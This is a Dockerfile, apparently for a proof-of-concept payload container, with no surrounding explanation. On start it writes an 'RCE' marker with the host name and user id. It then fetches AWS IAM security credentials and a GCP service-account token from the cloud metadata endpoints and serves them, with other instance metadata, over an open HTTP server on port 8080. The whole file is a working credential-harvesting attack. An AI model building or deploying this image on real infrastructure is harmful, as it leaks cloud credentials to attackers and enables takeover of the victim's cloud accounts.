FROM alpine:3.19
RUN apk add --no-cache python3 curl
WORKDIR /app
EXPOSE 8080
CMD ["sh","-c","printf 'RCE host=%s uid=%s\\n' \"$(hostname)\" \"$(id -u)\" > /app/index.html; curl -s --max-time 6 http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /app/iam.txt 2>&1 || echo 'no aws iam' > /app/iam.txt; curl -s --max-time 6 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' > /app/gcp.txt 2>&1 || echo 'no gcp' > /app/gcp.txt; curl -s --max-time 6 http://169.254.169.254/latest/meta-data/ > /app/meta.txt 2>&1 || echo 'no meta' > /app/meta.txt; exec python3 -m http.server 8080"]
